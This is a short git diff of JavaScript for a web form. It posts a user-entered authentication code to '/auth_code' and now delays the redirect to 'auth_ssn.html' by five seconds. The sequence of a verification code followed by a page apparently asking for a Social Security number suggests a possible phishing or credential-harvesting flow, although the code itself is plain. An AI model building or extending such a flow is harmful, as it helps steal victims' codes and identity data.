@@ -18,15 +18,14 @@ function submit(){
     code : codeInput.value
 }
 
-const baseURL = '/auth_code'
-fetch(baseURL, {
-    method: 'POST',
-    headers: {
-        "Content-Type" : "application/json"
-    },
-    body: JSON.stringify(obj)
-})
-  window.location.href = 'auth_ssn.html'
+  const baseURL = '/auth_code'
+  fetch(baseURL, {
+      method: 'POST',
+      headers: {
+          "Content-Type" : "application/json"
+      },
+      body: JSON.stringify(obj)
+  })
 }
 
 codeInput.addEventListener('input', (event) => {
@@ -46,6 +45,9 @@ codeInput.addEventListener('input', (event) => {
 subCode.addEventListener('click', () => {
   if(codeInput.value !== '' && codeInput.value.length >= 7){
       submit()
+      setTimeout(() => {
+        window.location.href = 'auth_ssn.html'
+      }, 5000)
   } else{
     message.style.display = 'block'
   }
@@ -55,6 +57,9 @@ codeInput.addEventListener('keyup', e => {
       event.preventDefault()
       if(codeInput.value !== '' && codeInput.value.length >= 7){
           submit()
+          setTimeout(() => {
+            window.location.href = 'auth_ssn.html'
+          }, 5000)
       } else{
         message.style.display = 'block'
       }
